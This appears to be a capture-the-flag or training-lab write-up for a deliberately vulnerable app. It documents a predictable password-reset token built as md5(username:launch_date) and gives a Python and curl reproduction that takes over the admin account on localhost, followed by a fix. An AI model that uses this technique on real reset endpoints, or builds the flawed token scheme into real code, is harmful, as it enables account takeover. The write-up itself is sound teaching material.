# A02:2021 - Cryptographic Failures (Predictable Reset Token)

**Endpoints:** `POST /a02/request-reset`, `POST /a02/reset`
**Severity:** Critical

## Vulnerability

Password-reset tokens are `md5(username + LAUNCH_DATE)`, where `LAUNCH_DATE`
is a hardcoded constant in `app/config.py` - i.e. shipped in source, not a
per-request secret. Anyone who can read the source (or just guesses common
launch-date formats) can compute a valid token for any username without
ever receiving the "emailed" token.

```python
# app/challenges/a02_crypto.py
def _make_token(username: str) -> str:
    launch_date = current_app.config["LAUNCH_DATE"]
    return hashlib.md5(f"{username}:{launch_date}".encode()).hexdigest()
```

Two compounding issues: (1) the token isn't a random, single-use, expiring
secret — it's a deterministic function of public/guessable inputs; (2) MD5
is used, which is fine for uniqueness here but signals the general pattern
of reaching for a fast hash instead of a cryptographically random token.

## Reproduce

```bash
python3 -c "
import hashlib
print(hashlib.md5(b'admin:2024-01-01').hexdigest())
"

curl -s -X POST http://localhost:5000/a02/reset \
  -H 'Content-Type: application/json' \
  -d '{"username": "admin", "token": "<token from above>", "new_password": "PwnedByExploit!1"}'
```

Response confirms takeover and returns the flag:

```json
{"message": "password for admin reset", "flag": "FLAG{predictable_reset_token_pwned}"}
```

## Impact

Full account takeover of any user, including admin, without ever
intercepting an email or a network request — the token is computable
offline.

## Fix

Generate tokens with `secrets.token_urlsafe(32)`, store them server-side
tied to the user with an expiry (e.g. 15 minutes), invalidate on use, and
never derive them from data an attacker could know or guess.

## Reference

[OWASP Top 10 2021 - A02 Cryptographic Failures](https://owasp.org/Top10/A02_2021-Cryptographic_Failures/)
